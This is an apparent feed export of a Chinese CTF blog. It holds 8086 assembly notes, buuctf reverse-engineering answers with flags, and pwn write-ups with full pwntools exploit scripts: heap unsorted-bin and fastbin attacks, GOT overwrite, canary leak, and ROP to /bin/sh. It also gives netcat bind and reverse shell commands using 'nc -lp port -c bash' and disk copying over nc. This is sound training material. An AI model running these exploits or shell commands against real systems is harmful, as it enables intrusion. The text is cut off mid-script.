io.sendline(&#39;3&#39;)def message (notice):    io.sendline(&#39;4&#39;)    #io.recvuntil(&#39;order: &#39;)    io.sendline(notice)#1 --- leak the libcbaseadd(b&#39;a&#39;,b&#39;b&#39;)order()free_got = elf.got[&#39;free&#39;]add(b&#39;a&#39;*27+p32(free_got) , b&#39;b&#39;*25)show()io.recvuntil(&#39;Description: &#39;)io.recvuntil(&#39;Description: &#39;)free_addr = u32(io.recv(4).ljust(4,b&#39;\x00&#39;))print (&quot;free_addr=&quot; , hex(free_addr))libc_base = free_addr - libc.sym[&#39;free&#39;]system_addr = libc_base + libc.sym[&#39;system&#39;]print (&quot;system_addr&quot;, hex(system_addr))#2 --- malloc to bssfor i in range(0x40-2-1):    add(b&#39;a&#39;*27+p32(0),str(i))message_addr = 0x0804A2A8add(b&#39;a&#39;*26+b&#39;A&#39;+p32(message_addr) , b&#39;b&#39;) #write from A8 , message from ccpayload = b&#39;a&#39;*0x1c + b&#39;\x00&#39;*4 + b&#39;A&#39;*4 + p32(100)           #padding + last_chunk + pre_size + sizemessage(payload)    #from c0order()io.recvuntil(&#39;Okay order submitted!&#39;)#get_shellpayload = p32(elf.got[&#39;strlen&#39;])#gdb.attach(cn)add(&#39;b&#39;,payload)   # 0x40: 0x804a2a0 —▸ 0x863c390 ◂— 0x0gdb.attach(cn)message(p32(system_addr)+ b&#39;;/bin/sh\x00&#39;)  #0x804a2a0gdb.attach(io)io.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/03/30/4Ycae86bfKsDMCE.gif&quot;&gt;&lt;/p&gt;
&lt;p&gt;一字节等于8位或者说8比特&lt;/p&gt;
&lt;p&gt;2字节==16位&lt;/p&gt;
&lt;p&gt;1字长32位PC的字长是32bit，现在开始成为主流的64位C</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>汇编学习</title>
    <link href="http://example.com/2020/12/08/%E6%B1%87%E7%BC%96/"/>
    <id>http://example.com/2020/12/08/%E6%B1%87%E7%BC%96/</id>
    <published>2020-12-08T15:46:44.472Z</published>
    <updated>2021-01-30T15:50:07.822Z</updated>
    
    <content type="html"><![CDATA[<p><strong>基础</strong></p><p>-r<br>                         查看寄存器内容</p><pre><code>-r ip   :0                            将IP改为0000</code></pre><p>-t   单步执行</p><p>-d  查看内存内容（几个字节）</p><p>-e  改写偏移地址</p><p>-u  将机器码编译为汇编指令</p><p>-a  以汇编语言的形式写入程序</p><hr><p>MASA中<br>move ax  , [0]       将al的值赋值为0</p><p>move ax  , ds:[0]   将偏移地址为0的内存单元的内容放进ax中</p><p>move ax  , [bx]      将bx的内容放进ax中  </p><hr><p>dw                         定义字形数据      //数据以字为单位，而非字节</p><p>dw                         定义字形数据<br>数据以字为单位，而非字节</p><pre><code>dw定义 字 类型变量，一个字数据占2个字节单dao元，读完一个，偏移量加2db定义 字节 类型变量，一个字节数据占1个字节单元，读完一个，偏移量加1。dd定义 双字类 型变量，一个双字数据占4个字节单元，读完一个，偏移量加4。  </code></pre><hr><p>AX的    低八位是AH寄存器，     高八位是AX  寄存器</p><p>dup 3（0）定义三个字节： 0，0，0</p><p>offset  取标号的偏移地址                 // start : mov ax , offset  start     ;相当于 mov  ax , 0 </p><p>   mul    bl<br>                                                        //al与 bl 相乘结果保存至 ax   </p><p><strong>div</strong>  </p><pre><code>被除数：默认放在AX或DX和AX，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数 为16位， 被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位。结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。</code></pre><p><strong>inc</strong>    自增 1 </p><p><strong>dec</strong>   自减 1</p><hr><p><strong>jump</strong>  跳转</p><p>jcxz     cx==0 时跳转</p><p><strong>call</strong>       </p><pre><code>sp=sp-2((ss)*16+(sp))=ipip=ip+十六位位移</code></pre><p>push  ip </p><p>jump  near  ptr  标号             </p><p>ip=ip+十六位位移</p><p>**call far ptr 标号 **</p><pre><code>push  cspush  ipjump far ptr 标号</code></pre><hr><p><strong>ret</strong></p><pre><code>pop  ip</code></pre><p><strong>retf</strong>       </p><pre><code>pop  ippop  cs     </code></pre><p>可以 call  和  ret 的配合使用 </p><hr><p>**标志寄存器 ** </p><p>ZF   （零标志位）  </p><pre><code>记录指令执行后结果是否为0结果=0，ZF=1 ； 结果!=0 ,ZF=0</code></pre><p>PF  （奇偶标志位）</p><pre><code>1的个数为偶数，PF=1 ；1的个数为奇数，PF=0 ;</code></pre><p>SF  (符号标志位)</p><pre><code>结果为负，sf=1 ;结果为正，sf=0 ;</code></pre><p>CF (进位标志位)</p><p>在无符号运算中，记录运算结果是否向更高位进位。</p><pre><code>记录进位或借位值 。</code></pre><p>OF （溢出）</p><p>在有符号运算中</p><pre><code>有溢出，of=1；无溢出，of=0；</code></pre><p><img src="https://i.loli.net/2021/01/26/75kDuEM6SFhAH4j.gif"></p><hr><p><strong>adc指令</strong></p><p>格式：adc 操作对象1 ， 操作对象2</p><p>如</p><pre><code>    adc ax , bx功能(ax)=(ax)+(bx)+cf</code></pre><hr><p><strong>sbb</strong> （借位减法指令）</p><p>指令格式：  sbb  操作对象1 ， 操作对象2 </p><p>功能   ：  对象1 = 对象1 - 对象2 -cf</p><pre><code>如sbb ax , bx (ax)=(ax)-(bx)-cf</code></pre><hr><p><strong>cmp</strong> (比较指令)</p><p>格式： cmp  对象1 ， 对象2</p><p>功能： 计算对象1 - 对象2 ，结果不保存，仅改变标志寄存器。</p><p>用于比较大小时，若有溢出，结果不一定正确。</p><hr><p><strong>检测比较结果的条件转移指令</strong></p><p><img src="https://i.loli.net/2021/01/27/dEjJfpZMbiHgU7y.jpg"></p><hr><p>df标志和传送指令</p><p>df=0 操作后 si di 递增</p><p>df=1 操作后 si di 递减</p><p>↑（用于指明传送方向）↑</p><p>格式 movsb</p><p>功能：传送字节</p><p>（1）</p><p>((es)*16+(di))=((ds))*16+(si))</p><p>(2)</p><p>如果df=0则： (si)=(si)+1 ; (di)=(di)+1</p><p>如果df=1则： (si)=(si)-1 ; (di)=(di)-1</p><p>♤</p><p>格式 movsw</p><p>功能：传送字</p><p>（1）</p><p>((es)*16+(di))=((ds))*16+(si))</p><p>(2)</p><p>如果df=0则： (si)=(si)+2 ; (di)=(di)+2</p><p>如果df=1则： (si)=(si)-2 ; (di)=(di)-2</p><hr><p>pushf : 将标志寄存器的值压栈</p><p>popf  ：从栈处弹出数据送入标志寄存器</p><hr><p>内中断</p><p>过程</p><p>（1）取得中断码N ；</p><p>（2）pushf</p><p>（3）TF=0, IF=0</p><p>（4）push cs ; push  ip </p><p>（5）(ip)=(N<em>4) , (cs)=(N</em>4)+2</p><p>最后cpu开始执行程序员编写的中断处理程序</p><hr><p>iret 指令</p><p>功能：</p><p>pop IP</p><p>pop CS</p><p>popf</p><hr><p>int</p><p>格式 int n</p><p>功能 ：</p><p>（1）取中断类型码n</p><p>（2）标志寄存器，IF=0,TF=0</p><p>（3）CS,IP入栈</p><p>（4）(ip)=(n<em>4),(cs)=(n</em>4+2)</p><hr><p>端口</p><p>读写端口指令</p><p>in  ax , 21h ;</p><p>out ax , 21h ;</p><p>逻辑移位指令</p><p>shl  :  将寄存器或内存单元的数据左移一位，将最后移出的一位写入CF中。其他用0补足。</p><p>shr  ： 与shl相反。</p><hr><p>外中断(外设引发的中断)</p><p>cpu检测到可屏蔽中断，如果IF=1.执行完当前指令后，执行中断；<br>如果    IF-0 . 不执行中断。</p><p>不可屏蔽中断过程</p><p>标志寄存器入栈，IF=0，TF=0；</p><p>cs,ip入栈；</p><p>(ip)=(8),(cs)=(OAH)</p><p>如图</p><p><img src="https://i.loli.net/2021/01/30/nDRHCjyATZwpFah.gif"></p><p>相当于</p><pre><code>for(i=1000 ; i&gt;0 ; i--)&#123;    for(j=10000 ; j&gt;0 ; j--)    &#123;    &#125;&#125;</code></pre><p><strong>seg</strong> </p><p>取标号处段地址。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;基础&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;-r&lt;br&gt;                         查看寄存器内容&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-r ip

   :0      
                      将IP改为0000&lt;/code</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>buuctf   re   WP</title>
    <link href="http://example.com/2020/12/08/re_reverse/"/>
    <id>http://example.com/2020/12/08/re_reverse/</id>
    <published>2020-12-07T16:06:25.436Z</published>
    <updated>2020-12-13T17:31:57.187Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDA中的快捷键"><a href="#IDA中的快捷键" class="headerlink" title="IDA中的快捷键"></a><strong>IDA中的快捷键</strong></h1><pre><code>&quot;r&quot;           将ASC码转化为字符 “h”           将字符转化为asv码“f5”          查看伪代码“ c ”   “shift+f12”   查看字符串“ctrl+x  ”    查看ida view -a 界面“strcmp”      函数是string compare(字符串比较)的缩写，用于比较两个字符串并根据比较结果返回整数。基本形式为strcmp(str1,str2)，若str1=str2，则返回零；若str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数。</code></pre><h1 id="reverse-1"><a href="#reverse-1" class="headerlink" title="reverse 1"></a>reverse 1</h1><p><img src="https://i.loli.net/2020/12/08/HdpXyfstO8LMFZP.gif"></p><p>如图，这个hello world 非常可疑，可能就是flag</p><p><img src="https://i.loli.net/2020/12/08/6R7TrIeuhHDaNEo.gif"></p><p>str2就是flag，但是有个if函数将所有的o改成了0</p><h1 id="reverse-2"><a href="#reverse-2" class="headerlink" title="reverse 2"></a>reverse 2</h1><p>首先f5查看伪代码</p><p><img src="https://i.loli.net/2020/12/08/eGRk2xPzitOYqjE.jpg"></p><p><img src="https://i.loli.net/2020/12/08/nGfT5xzVNmEqSk8.jpg"></p><p>阅读可知flag中的i和r都被依次替换为了1</p><h1 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h1><p><img src="https://i.loli.net/2020/12/10/uDXVc9QJ8YgWvCS.gif"></p><p>这东西看上去就像是flag的样子，去试了试base64和md5都不对，没想到</p><p>flag竟然就是flag{49d3c93df25caad81232130f3d2ebfad}。</p><p>好像没什么内涵嘛  ？_？</p><h1 id="JDCTF"><a href="#JDCTF" class="headerlink" title="JDCTF"></a>JDCTF</h1><p>这题挺简单的，与上题差不多。</p><p>直接放进ida里找字符串。</p><h1 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h1><p>用jbe打开后寻找flag字符串，就可以了</p><p><img src="https://i.loli.net/2020/12/10/N7Hp6Z4Lk3jnJUh.gif"></p><h1 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h1><p>puts(1 up)</p><p>puts(2 down)</p><p>puts(3 left)</p><p>printf(4 right)</p><p>1 2 3 4 依次控制上下左右。</p><p><img src="https://i.loli.net/2020/12/14/GyY9pnIPZgmUK4O.gif"></p><p>那么这个字符串就是迷宫了</p><p><img src="https://i.loli.net/2020/12/14/avG48pCXYcEVgon.gif"></p><p>既然是25个数就猜测他是 5x5 的迷宫吧^_^</p><p><img src="https://i.loli.net/2020/12/14/ziEXqCP5TQsbMef.gif"></p><p>所以 222441144222 就可以了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IDA中的快捷键&quot;&gt;&lt;a href=&quot;#IDA中的快捷键&quot; class=&quot;headerlink&quot; title=&quot;IDA中的快捷键&quot;&gt;&lt;/a&gt;&lt;strong&gt;IDA中的快捷键&lt;/strong&gt;&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;&amp;quot;r&amp;quot;        </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>buuctf&amp;&amp;攻防世界</title>
    <link href="http://example.com/2020/12/05/buu&amp;&amp;%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn/"/>
    <id>http://example.com/2020/12/05/buu&amp;&amp;%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn/</id>
    <published>2020-12-05T05:04:35.321Z</published>
    <updated>2021-09-24T06:47:00.034Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p><a href="https://blog.csdn.net/qq_43394612/article/details/84900668">格式化字符串漏洞</a></p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>发生栈溢出的基本前提是：</p><p>1.程序必须向栈上写入数据</p><p>2.写入的数据大小没有被良好地控制。</p><pre><code>char a[10] get(a)</code></pre><hr><pre><code>strcpy</code></pre><p>strcpy( dest,  src) 把 src 所指向的字符串复制到 dest。</p><p>需要注意的是如果目标数组 dest 不够大，而源字符串的长度又太长，可能会造成缓冲溢出的情况。</p><hr><pre><code>read</code></pre><p>ssize_t read(int fd, void *buf, size_t count);   </p><p>ssize_t为有符号整型，size_t为无符号整型。fd为相应的文件描述符；buf为用户给定的数据缓冲区，该缓冲不是固定大小的，由count值决定其大小（用户给定，字节数）。如 read( fd , “hello” , 5 ); 此时的void *buf为char *类型。即count为请求读取的字节数（即buf的大小）。该函数的返回值为-1时，表示读取数据失败；返回值&gt;0时，表示读出的字节数；返回值等于0时，表示已经读完了，因此没有数据可读了。</p><p>当count&gt;buf时产生溢出。</p><hr><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p><img src="https://i.loli.net/2021/02/25/5sKerzuFE28ACcx.gif"></p><p><img src="https://i.loli.net/2021/02/25/EJn2KfS8UaQebPy.gif"></p><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p><img src="https://i.loli.net/2021/03/02/BcoJ6nIkL9YdiU4.gif"><br><img src="https://i.loli.net/2021/03/02/W56LCPXRdzJMZB3.gif"><br><img src="https://i.loli.net/2021/03/02/iIKJHMcmEgnzdV6.gif"></p><p><em>持续更新</em></p><h1 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h1><p><strong>第一道pwn</strong></p><p>test_your_nc</p><p><img src="https://i.loli.net/2020/12/05/EsnHKRjyl8CiWVA.gif"></p><p>思路:根据提示，直接NC即可</p><p>NC:的使用</p><p>nc的全名是netcat，其主要用途是建立和监听任意TCP和UDP连接，支持ipv4和ipv6。因此，它可以用来网络调试、端口扫描等等。</p><p>那么netcat怎么用呢？？？</p><pre><code>-n 以数字形式表示的IP地址-v 显示详细信息 [使用=vv获取更详细的信息-p port 本地端口-q secs 在标准输入且延迟后退出（翻译的不是很好，后面实例介绍）</code></pre><p><strong>NC远程控制</strong></p><p>这个比较有意思，我放在第一。<br>正向连接<br>A:nc -lp port -c bash<br>B:nc ip port<br>A将自己的Bash发给B<br>反向连接<br>A:nc -lp port<br>B:nc ip port -c bash<br>B将自己的Bash发给A<br>win下Bash换成cmd</p><p><img src="https://i.loli.net/2020/12/05/Ic5JZr6RhPF3s2N.png"></p><p><img src="https://i.loli.net/2020/12/05/fAbUJRXF21CPKgZ.png"></p><p><img src="https://i.loli.net/2020/12/05/5EMTdkSR7G6vFZD.png"></p><p><strong>使用NC进行信息收集</strong></p><p>简单的建立连接，就是侦听模式和传输模式<br>nc -l -p port监听指定端口号<br>nc -nv ip port连接对方tcp端口，默认情况下，双方可以发送文本信息<br>收集目标机上的进程信息<br>nc -l -p 4444 &gt;wing.txt将远程发送过来的内容保存在本地<br>Ps aux |nc -nv ip port -q 1 标准输入完成后delay一秒钟，会发送到侦听端<br><img src="https://i.loli.net/2020/12/05/Knela82oGHER3rb.png"><br><img src="https://i.loli.net/2020/12/05/7sSoZM9Y5dnKXTf.png"><br><img src="https://i.loli.net/2020/12/05/y7idgqacVLJeUMp.png"></p><p><strong>NC传输文件/目录</strong></p><p>nc -lp 4444 &gt;1.txt 1.txt就是你要保存的文件名 自定义</p><p>nc -nv ip port &lt;1.txt -q 1 将文件发送给侦听端<br>ps：侦听端的文件名最好按照文件本身来命名</p><p>tar -cvf - 目录名/|nc -lp port -q 1<br>将目录打包<br>nc -nv ip port |tar -xvf -<br>将目录解包</p><p><strong>NC文件加密传输</strong></p><p>apt-get install mcrypt<br>A： nc -lp port|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb &gt;文件名<br>B：mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt;文件名|nc -nv ip port -q 1<br>理解：B将文件加密发送，A接受后先解密再保存到本地，B在1s后退出.<br>主要是利用mcrypt进行加密<br>NC流媒体服务</p><p>A:cat wing.mp4|nc -lp port<br>B:nc -nv ip port |mplayer -vo x11 -cache 4000<br>A让wing.MP4这个文件成为流的形式发送到B，B用mplayer播放，接收多少播放多少，指定缓存4000bytes。<br>NC端口扫描</p><p>nc -nvz ip 1-65535</p><p><img src="https://i.loli.net/2020/12/05/7EgP3MK5Uyns2iO.png"></p><p>默认使用tcp进行扫描<br>NC复制磁盘</p><p>A:nc -lp port |dd of=/dev/sda<br>B: dd if=/dev/sda | nc -nc ip port -q 1<br>If是input filter<br>Of 是output filter<br>B将数据复制到A挂载的硬盘上</p><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>先扔进ida看看</p><p><img src="https://i.loli.net/2021/02/02/2CZ1K47IJqMGtev.gif"></p><p>像数组一样存进去，可以利用栈溢出修改返回地址</p><p>看来fun函数里就有我们想要的</p><p><img src="https://i.loli.net/2021/02/02/T3pJXb6kr2xDsj9.gif"></p><p>在去栈里看看</p><p><img src="https://i.loli.net/2021/02/02/QOu2ZtoKq7VJzR1.gif"></p><p>运行就这个脚本，就ok了（网上搜的，下次自己写^?^）</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *#p = process(&#39;./pwn1&#39;)p = remote(&#39;node3.buuoj.cn&#39;, 27560)#p.recvuntil(&quot;please input&quot;) buf_1 = &#39;a&#39; * 15 + p64(0x401186)#gdb.attach(p)p.sendline(buf_1)p.interactive()</code></pre><p>##ciscn_2019_s_3 </p><p>查看gadget函数可以发现发现有</p><pre><code>mov rax , 59retn</code></pre><p>而 execve 的系统调用号 为 59 ， 所以打算使用 syscall 进行系统调用</p><h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>这道题主要是复现调试过程</p><p><img src="https://i.loli.net/2021/05/04/bzda3i8DmwPtjVc.gif"></p><p>首先进入vuln找到溢出nop下断点  </p><pre><code>gdb.attach(p,&#39;b *0x8048600&#39;)利用gdb动调，在0x8048600处下了个断点</code></pre><p><img src="https://i.loli.net/2021/05/04/65xzEJdFtNuH87M.gif"></p><p>首先’ashme’为输入的内容，但会发现少了’cr’，因为0x72的ascII码是’r’，0x63是’c’。（小端序）</p><p>所以其实是从0xffc0ba12处开始输入字符，而ebp为0xffc0ba28,所以输入溢出应为0x16(0xffc0ba28 - 0xffc0ba12)</p><p>返回地址则应填充泄露的栈的地址，之前泄露的栈地址为0xffc0ba10，那么偏移为1c(ebp+4-a10)，所以返回地址覆盖为0xffc0ba2c (0xffc0ba10+1c)</p><p>##EasyHeap</p><p>入门的heap题，还是比较基础的。</p><p>进入magic函数，发现有直接调用system(“cat /home/pwn/flag”)的语句，还有这种好事？！</p><p>不过需要让magic &gt; 0x1305 ， 于是可以利用unsortbin_attack ， unsortbin_attack可以修改任意地址值为一个较大的数，因为unsortbin的最后的chunk的bk指针会指向main_area ,所以我们可以利用其修改magic为一个较大值。</p><pre><code>create(0x10 , &quot;aaaa&quot;)  #idx 0create(0x80 , &quot;aaaa&quot;)  #idx 1create(0x80 , &quot;aaaa&quot;)  #idx 2create(0x10,b&quot;/bin/sh\x00&quot;)#id3 dele(1)edit (0,0xff,b&#39;A&#39;*0x18 + p64(0x91) + p64(0) + p64(magic))create(0x80,&quot;bbbb&quot;)</code></pre><p>利用溢出漏洞，将idx0 溢出修改idx1的bk修改为magic_addr-0x10的地址，然后再malloc一个unsort_bin就成功修改啦</p><pre><code>#! /usr/bin/python3from pwn import*elf = ELF(&#39;./easyheap&#39;)io = process(&#39;./easyheap&#39;)#io = remote(&#39;node3.buuoj.cn&#39;,27082)libc = elf.libccontext.log_level = &#39;debug&#39;#gdb.attach(io)system = elf.sym[&#39;system&#39;]cat_flag = 0x0400F49magic=0x0006020C0-0x10def create(size, content):    io.sendlineafter(&#39;choice :&#39;, str(1))    io.sendlineafter(&#39;Heap :&#39;, str(size))    io.sendafter(&#39;heap:&#39;, content)def edit(idx,size,content):    io.sendlineafter(&#39;choice :&#39;, str(2))    io.sendlineafter(&#39;Index :&#39;, str(idx))    io.sendlineafter(&#39;Size of Heap : &#39;, str(size))    io.sendafter(&#39;Content of heap : &#39;, content)def dele (idx):    io.sendlineafter(&#39;choice :&#39;,str(3))    io.sendlineafter(&#39;Index :&#39;,str(idx))create(0x10 , &quot;aaaa&quot;)  #idx 0create(0x80 , &quot;aaaa&quot;)  #idx 1create(0x80 , &quot;aaaa&quot;)  #idx 2create(0x10,b&quot;/bin/sh\x00&quot;)#id3 dele(1)edit (0,0xff,b&#39;A&#39;*0x18 + p64(0x91) + p64(0) + p64(magic))create(0x80,&quot;bbbb&quot;)io.sendlineafter(&#39;choice :&#39;, str(4869))gdb.attach(io)#gdb.attach(io)io.interactive()</code></pre><p>本以为我的计划 就如高跟鞋踩进井盖缝一样严丝合缝时 ，对面竟然没有/home/pwn/flag的路径</p><p>所以我们只能plan2 了</p><p>由于已知heaparray的地址，所以可以采用覆盖free_got 为system_got 的方法</p><pre><code>create(0x10 , b&quot;aaaa&quot;)  #idx 0create(0x10 , b&quot;aaaa&quot;)  #idx 1create(0x60 , b&quot;aaaa&quot;)  #idx 2create(0x10,b&quot;/bin/sh\x00&quot;)#id3 print(&quot;ok&quot;)dele(2)edit(1,0x30,b&#39;a&#39;*0x10 + p64(0) + p64(0x71) + p64(fake_fastbin) + p64(0))#edit(1,0x30,b&#39;a&#39;*0x10 +  p64(0) + p64(0x71) + p64(fake_fastbin) + p64(0))create(0x60,b&#39;bbbb&#39;) #idx1#gdb.attach(io)payload=0x23*b&#39;E&#39;+ p64(free_got)create(0x60,payload)#idx4 payload = p64(elf.plt[&#39;system&#39;])print(&quot;system&quot;,hex(elf.plt[&#39;system&#39;]))edit(0,len(payload),payload)</code></pre><p>依然是溢出idx1，来修改idx2的fd指针，经fd指针指向heaparray的地址附近，利用字节错位将fack_chunk的size位与bin相匹配（应在70~7f之间）</p><p>最后将system_plt 写入free_got 的地址就可以了</p><p>最最后调用一下free，就可以getshell</p><pre><code>#! /usr/bin/python3from pwn import*elf = ELF(&#39;./easyheap&#39;)#io = process(&#39;./easyheap&#39;)io =remote(&quot;node3.buuoj.cn&quot;,27082)libc = elf.libc#context.log_level = &#39;debug&#39;#gdb.attach(io)system = elf.sym[&#39;system&#39;]cat_flag = 0x0400F49magic=0x0006020C0-0x10def create(size, content):    io.sendlineafter(&#39;choice :&#39;, str(1))    io.sendlineafter(&#39;Heap :&#39;, str(size))    io.sendafter(&#39;heap:&#39;, content)def edit(idx,size,content):    io.sendlineafter(&#39;choice :&#39;, str(2))    io.sendlineafter(&#39;Index :&#39;, str(idx))    io.sendlineafter(&#39;Size of Heap : &#39;, str(size))    io.sendafter(&#39;Content of heap : &#39;, content)def dele (idx):    io.sendlineafter(&#39;choice :&#39;,str(3))    io.sendlineafter(&#39;Index :&#39;,str(idx))heaparray=0x006020E0fake_fastbin=0x6020adsystem_addr=0x400C2Cfree_got=elf.got[&quot;free&quot;]print(&quot;free_got----&gt;&quot;,hex(free_got))create(0x10 , b&quot;aaaa&quot;)  #idx 0create(0x10 , b&quot;aaaa&quot;)  #idx 1create(0x60 , b&quot;aaaa&quot;)  #idx 2create(0x10,b&quot;/bin/sh\x00&quot;)#id3 print(&quot;ok&quot;)dele(2)edit(1,0x30,b&#39;a&#39;*0x10 + p64(0) + p64(0x71) + p64(fake_fastbin) + p64(0))#edit(1,0x30,b&#39;a&#39;*0x10 +  p64(0) + p64(0x71) + p64(fake_fastbin) + p64(0))create(0x60,b&#39;bbbb&#39;) #idx1#gdb.attach(io)payload=0x23*b&#39;E&#39;+ p64(free_got)create(0x60,payload)#idx4 payload = p64(elf.plt[&#39;system&#39;])print(&quot;system&quot;,hex(elf.plt[&#39;system&#39;]))edit(0,len(payload),payload)#gdb.attach(io)io.recvuntil(&quot;Your choice :&quot;)io.sendline(str(3))io.recvuntil(&quot;Index :&quot;)io.sendline(str(3))io.interactive()</code></pre><p>##bjdctf_2020_babyrop2</p><p>上来就有个格式化字符串漏洞，可以用来泄露canary</p><pre><code>io.sendline(&#39;%7$p&#39;)io.recvuntil(&#39;0x&#39;)canary = int(io.recv(16),16)print(hex(canary))</code></pre><p>然后泄露libc版本，根据libc来进行溢出并getshell</p><pre><code>payload = b&quot;a&quot; * 0x18 + p64(canary) + b&quot;a&quot; * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)io.sendlineafter(&quot;story!&quot;, payload)puts_addr = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))</code></pre><p>exp如下—————————————</p><pre><code>#! /usr/bin/python3from pwn import*from LibcSearcher import*elf = ELF(&#39;./bjdctf_2020_babyrop2&#39;)libc = elf.libc#io = process(&#39;./bjdctf_2020_babyrop2&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27690)puts_got = elf.got[&#39;puts&#39;]puts_plt = elf.plt[&#39;puts&#39;]pop_rdi = 0x0400993vuln = 0x0400887io.recv()io.sendline(&#39;%7$p&#39;)io.recvuntil(&#39;0x&#39;)canary = int(io.recv(16),16)print(hex(canary))payload = b&quot;a&quot; * 0x18 + p64(canary) + b&quot;a&quot; * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)io.sendlineafter(&quot;story!&quot;, payload)puts_addr = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))print(&quot;puts_addr----&gt;&quot;,hex(puts_addr))libc = LibcSearcher(&#39;puts&#39;,puts_addr)libc_base = puts_addr - libc.dump(&#39;puts&#39;)system_addr = libc_base + libc.dump(&#39;system&#39;)binsh = libc_base + libc.dump(&#39;str_bin_sh&#39;)print(&quot;libc_base&quot;,libc_base)print(&quot;system_addr&quot;,system_addr)print(&quot;binsh&quot;,binsh)#io.sendline(b&#39;a&#39;*0x28)payload = b&quot;a&quot; * 0x18 + p64(canary) + b&quot;a&quot; * 8 + p64(pop_rdi) + p64(binsh) + p64(system_addr) + p64(vuln)io.sendline(payload)io.interactive()</code></pre><p>##babyfengshui_33c3_2016</p><p>这道题的漏洞出现在对于 输入字符的限制由地址之差来计算 的，因此我们可以通过free小chunk，并malloc大chunk从而分离两个地址的目的。从而构造成下面这样来绕过检测。</p><pre><code>堆块 0 des 0x100堆块1 des 0x80    堆块1 node 0x80    堆块2 des 0x8    堆块2 node 0x80    堆块0 node 0x80</code></pre><p>然后通过溢出来写入free_got地址，并将其修改为system，即可</p><pre><code>from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;#p = process(&#39;./babyfengshui&#39;)p = remote(&#39;node3.buuoj.cn&#39;, 28668)elf = ELF(&#39;babyfengshui&#39;)def Add(size, length, text):    p.sendlineafter(&quot;Action: &quot;, &#39;0&#39;)    p.sendlineafter(&quot;description: &quot;, str(size))    p.sendlineafter(&quot;name: &quot;, &#39;qin&#39;)    p.sendlineafter(&quot;length: &quot;, str(length))    p.sendlineafter(&quot;text: &quot;, text)def Del(index):    p.sendlineafter(&quot;Action: &quot;, &#39;1&#39;)    p.sendlineafter(&quot;index: &quot;, str(index))def Dis(index):    p.sendlineafter(&quot;Action: &quot;, &#39;2&#39;)    p.sendlineafter(&quot;index: &quot;, str(index))def Upd(index, length, text):    p.sendlineafter(&quot;Action: &quot;, &#39;3&#39;)    p.sendlineafter(&quot;index: &quot;, str(index))    p.sendlineafter(&quot;length: &quot;, str(length))    p.sendlineafter(&quot;text: &quot;, text)Add(0x80, 0x80, &#39;qin&#39;)Add(0x80, 0x80, &#39;qin&#39;)Add(0x8, 0x8, &#39;/bin/sh\x00&#39;)Del(0)#注意堆块块首的长度Add(0x100, 0x19c, &quot;a&quot;*0x198+p32(elf.got[&#39;free&#39;]))Dis(1)p.recvuntil(&quot;description: &quot;)free_addr = u32(p.recv(4))libc = LibcSearcher(&#39;free&#39;, free_addr)libc_base = free_addr - libc.dump(&#39;free&#39;)sys_addr = libc_base + libc.dump(&#39;system&#39;)#堆块1的description指针已经被修改为free的地址，则可以将free地址内的内容替换为systemUpd(1, 0x4, p32(sys_addr))Del(2)p.interactive()</code></pre><p>##cmcc_simplerop</p><p>首先就是可以看见有int 0x80，我们可以系统调用，关于系统调用的指令，我们可以参考这个。</p><p><a href="https://blog.csdn.net/xiaominthere/article/details/17287965">系统调用</a></p><p>就是要构造成</p><p>　　int80(0xb,”/bin/sh”,null,null)</p><p>　　后面的四个参数分别是eax、ebx、ecx、edx。</p><p>但是没有bin/sh\x00,所以应该向bss段写入</p><p>payload = ‘a’*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8)</p><p>payload += p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr) + p32(int_addr)</p><pre><code> 1 from pwn import * 2  3 p = process(&#39;./simplerop&#39;) 4 context.log_level = &#39;debug&#39; 5  6 p.recv() 7 